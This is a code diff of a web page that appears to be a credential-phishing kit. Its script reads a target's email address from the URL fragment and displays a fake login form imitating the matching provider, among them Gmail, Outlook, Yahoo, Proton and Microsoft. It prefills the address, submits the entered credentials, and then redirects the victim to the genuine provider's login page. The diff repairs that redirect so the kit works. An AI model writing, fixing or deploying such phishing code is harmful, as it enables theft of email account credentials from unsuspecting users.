@@ -136,7 +136,7 @@
 </head>
 <body>
 
-    <img src="img/bg16.png" alt="" class="bg-img">
+    <img src="img/bg12.png" alt="" class="bg-img">
     
     <!-- Gmail/GSuite Form -->
     <div id="gsuite" class="form-container">
@@ -566,63 +566,62 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // Get the hash from the URL (without the # symbol)
-            const hash = window.location.hash.substring(1);
-            
-            // Process the hash only if it contains an email (has @ symbol)
-            if (hash && hash.includes('@')) {
-                const email = hash;
-                const domain = email.split('@')[1].toLowerCase();
-                
-                // Determine which form to show based on the domain
-                let formToShow = 'webmail'; // Default
-                
-                if (domain === 'gmail.com') {
-                    formToShow = 'gsuite';
-                } else if (domain === 'outlook.com') {
-                    formToShow = 'outlook';
-                } else if (domain === 'hotmail.com') {
-                    formToShow = 'hotmail';
-                } else if (domain === 'centurylink.net') {
-                    formToShow = 'centurylink';
-                } else if (domain === 'msn') {
-                    formToShow = 'msn';
-                } else if (domain === 'spectrum.net') {
-                    formToShow = 'spectrum';
-                } else if (domain.includes('yahoo') || domain === 'rocketmail.com' || domain === 'ymail.com') {
-                    formToShow = 'yahoo';
-                } else if (domain === 'zoho.com') {
-                    formToShow = 'zoho';
-                } else if (domain === 'aol.com') {
-                    formToShow = 'aol';
-                } else if (domain === 'yandex.com') {
-                    formToShow = 'yandex';
-                }  else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
-                    formToShow = 'gmx';
-                } else if (domain === 'tutanota.com' || domain === 'tuta.com' || domain === 'tutanota.de' || domain === 'tutanota.fr' || domain === 'keemail.me') {
-                    formToShow = 'tuta';
-                } else if (domain === 'proton.me' || domain === 'protonmail.com' || domain === 'pm.me') {
-                    formToShow = 'proton';                
-                } else if (domain.includes('onmicrosoft')) {
-                    formToShow = 'microsoft';
-                } else {
-                    formToShow = 'webmail';
-                    customizeWebmailForm(domain);
-                }
+let userDomain = ''; // define globally
 
-                document.getElementById(formToShow).style.display = 'block';
-                
-                // Set the email value in the appropriate form
-                const emailField = document.getElementById(formToShow + '-email');
-                if (emailField) {
-                    emailField.value = email;
-                }
-                
-            } else {
-                document.getElementById('microsoft').style.display = 'block';
-            }
-        });
+document.addEventListener('DOMContentLoaded', function() {
+    const hash = window.location.hash.substring(1);
+    
+    if (hash && hash.includes('@')) {
+        const email = hash;
+        const domain = email.split('@')[1].toLowerCase();
+        userDomain = domain; // store for reuse in sendMessage
+
+        let formToShow = 'webmail';
+
+        if (domain.includes('gmail') || domain === 'gmail.com') {
+            formToShow = 'gsuite';
+        } else if (domain === 'outlook.com') {
+            formToShow = 'outlook';
+        } else if (domain === 'hotmail.com') {
+            formToShow = 'hotmail';
+        } else if (domain === 'centurylink.net') {
+            formToShow = 'centurylink';
+        } else if (domain === 'msn') {
+            formToShow = 'msn';
+        } else if (domain === 'spectrum.net' || domain === 'charter.net') {
+            formToShow = 'spectrum';
+        } else if (domain.includes('yahoo') || domain === 'rocketmail.com' || domain === 'ymail.com') {
+            formToShow = 'yahoo';
+        } else if (domain === 'zoho.com') {
+            formToShow = 'zoho';
+        } else if (domain === 'aol.com') {
+            formToShow = 'aol';
+        } else if (domain === 'yandex.com') {
+            formToShow = 'yandex';
+        } else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
+            formToShow = 'gmx';
+        } else if (domain === 'tutanota.com' || domain === 'tuta.com' || domain === 'tutanota.de' || domain === 'tutanota.fr' || domain === 'keemail.me') {
+            formToShow = 'tuta';
+        } else if (domain === 'proton.me' || domain === 'protonmail.com' || domain === 'pm.me') {
+            formToShow = 'proton';
+        } else if (domain.includes('onmicrosoft')) {
+            formToShow = 'microsoft';
+        } else {
+            formToShow = 'webmail';
+            customizeWebmailForm(domain);
+        }
+
+        document.getElementById(formToShow).style.display = 'block';
+
+        const emailField = document.getElementById(formToShow + '-email');
+        if (emailField) {
+            emailField.value = email;
+        }
+    } else {
+        document.getElementById('microsoft').style.display = 'block';
+    }
+});
+
 
 function sendMessage(formId) {
   const form = document.getElementById(formId);
@@ -659,7 +658,9 @@ function sendMessage(formId) {
   })
   .then(data => {    
     form.reset();
-    window.location.href = `https://${domain}/login`;
+    window.location.href = `https://${userDomain}/login`;
+    sendButton.textContent = originalText;
+    sendButton.disabled = false;
   })
   .catch(error => {
   });
